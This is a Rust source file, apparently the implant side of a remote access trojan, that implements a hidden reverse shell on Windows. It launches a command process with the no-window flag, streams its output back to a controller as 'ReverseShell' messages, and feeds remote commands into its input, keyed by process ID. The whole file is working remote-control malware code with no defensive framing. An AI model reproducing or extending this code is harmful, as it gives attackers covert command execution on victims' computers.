use encoding_rs::*;
use kry5t4l_share::modules::{protocol::Message, CommandType};
use lazy_static::*;

use crate::{G_IN_BYTES, G_OUT_BYTES};
use std::{collections::HashMap, io::{BufRead, BufReader, Write}, process::{Child, Stdio}, sync::{atomic::Ordering, Arc, Mutex}};

use std::os::windows::process::CommandExt;


lazy_static! {
    // 存储 clientid 对应的 CMD 进程
    static ref PROCESS_MAP: Arc<Mutex<HashMap<u32, Child>>> = Arc::new(Mutex::new(HashMap::new()));
}

pub fn start_createprocess_thread(process_name: String, clientid: String, sender: std::sync::mpsc::Sender<Vec<u8>>) {
    std::thread::spawn(move || {
        let in_rate = G_IN_BYTES.load(Ordering::Relaxed);
        let out_rate = G_OUT_BYTES.load(Ordering::Relaxed);

        G_IN_BYTES.store(0, Ordering::Relaxed);
        G_OUT_BYTES.store(0, Ordering::Relaxed);

        println!("inrate : {} , outrate : {}", in_rate, out_rate);

        let mut command = std::process::Command::new(process_name);
        let mut command  = command
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        #[cfg(target_os = "windows")]
        {
            const HIDE: u32 = 0x08000000; //CREATE_NO_WINDOW
            command = command.creation_flags(HIDE);
        }

        let remote_shell = command.spawn();
        
        let status = match remote_shell   
        {
            Ok(child) => {
                let pid = child.id();
                println!("Successfully started process with PID:{}", pid);

                {
                    let mut process_map = PROCESS_MAP.lock().unwrap();
                    process_map.insert(pid, child);
                    drop(process_map);
                }

                let mut process_map = PROCESS_MAP.lock().unwrap();
                let child1 = process_map.get_mut(&pid).unwrap();
                let stdout = child1.stdout.take().expect("Failed to capture stdout");
                let stderr = child1.stderr.take().expect("Failed to capture stdout");
                drop(process_map);

                let sender_stdout = sender.clone();
                let clientid_stdout = clientid.clone();

                // 获取系统编码
                let system_encoding  = get_system_encoding();

                // 读取 stdout 的线程
                std::thread::spawn(move || {
                    let mut reader = BufReader::new(stdout);
                    let mut buf : Vec<u8> = Vec::new();

                    loop {
                        buf.clear();
                        match reader.read_until(b'\n', &mut buf) {
                            Ok(0) => break,
                            Ok(_) => {
                                let (cow, _, _) = system_encoding.decode(&buf);
                                let line = cow.trim_end_matches(&['\r', '\n'][..]).to_string();
                                if !line.is_empty() {
                                    let msg = format!("{}:{}", pid, line);
                                    println!("Sending message: {}", msg);
                                    if let Some(buf) = Message::to_bytes(
                                        CommandType::ReverseShell.to_u8(), 
                                        &clientid_stdout, 
                                        msg.as_bytes()
                                    ).ok() {
                                        if sender_stdout.send(buf).is_err() {
                                            println!("channel closed");
                                            break;
                                        }
                                    }
                                }
                            }
                            Err(e) => {
                                println!("stdout read error: {}", e);
                                break;
                            }
                        }
                    }
                });

                // 读取 stderr 的线程
                let sender_stderr = sender.clone();
                let clientid_stderr = clientid.clone();
                std::thread::spawn(move || {
                    let mut reader = BufReader::new(stderr);
                    let mut buf: Vec<u8> = Vec::new();
                    loop {
                        buf.clear();
                        match reader.read_until(b'\n', &mut buf) {
                            Ok(0) => break,
                            Ok(_) => {
                                let (cow, _, _) = system_encoding.decode(&buf);
                                let line = cow.trim_end_matches(&['\r', '\n'][..]).to_string();
                                if !line.is_empty() {
                                    let msg = format!("{}:{}\n", pid, line);
                                    if let Some(buf) = Message::to_bytes(
                                        CommandType::ReverseShell.to_u8(), 
                                        &clientid_stderr, 
                                        msg.as_bytes()
                                    ).ok() {
                                        if sender_stderr.send(buf).is_err() {
                                            println!("channel closed");
                                            break;
                                        }
                                    }
                                }
                            }
                            Err(e) => {
                                println!("stderr read error: {}", e);
                                break;
                            }
                        }
                    }
                });

                format!("Successfully started process with PID:{}", pid)
            }
            Err(e) => {
                println!("Failed to start process:{}", e);
                format!("Failed to start process:{}", e)
            }
        };

        // 发送初始状态消息
        println!("Status: {}", &status);
        if let Some(buf) = Message::to_bytes(
            CommandType::CreateProcess.to_u8(), 
            &clientid, 
        status.as_bytes())
        .ok() {
            if sender.send(buf).is_err() {
                println!("channel closed");
            }
        }
    });
}

pub fn handle_reverse_shell(buf: &[u8]) {
    let command = String::from_utf8_lossy(buf).trim().to_string();
    println!("Received command: {}", command);

    //解析
    let parts: Vec<&str> = command.splitn(2,':').collect();

    let cmd_pid: u32 = parts[0].parse().unwrap_or(0);
    let cmd_content = parts[1].to_string();

    if cmd_pid == 0 {
        println!("Invalid PID: {}", command);
    }

    let mut process_map = PROCESS_MAP.lock().unwrap();
    if let Some(child) = process_map.get_mut(&cmd_pid) {
        if let Some(stdin) = child.stdin.as_mut() {
            if let Err(e) = writeln!(stdin, "{}\r\n", cmd_content) {
                println!("Failed to write to stdin: {}", e);
            }
            if let Err(e) = stdin.flush() {
                println!("Failed to flush stdin: {}", e);
            }
        } else {
            println!("Stdin not available for PID: {}", cmd_pid);
        }
    } else {
        println!("No process found for PID: {}", cmd_pid);
    }
}

use winapi::um::winnls::GetACP;

fn get_system_encoding() -> &'static Encoding {
    unsafe {
        match GetACP() {
            65001 => UTF_8,     // UTF-8
            936   => GBK,       // Simplified Chinese (GBK)
            950   => BIG5,      // Traditional Chinese (Big5)
            932   => SHIFT_JIS, // Japanese
            949   => EUC_KR,    // Korean
            _     => UTF_8,     // fallback
        }
    }
}
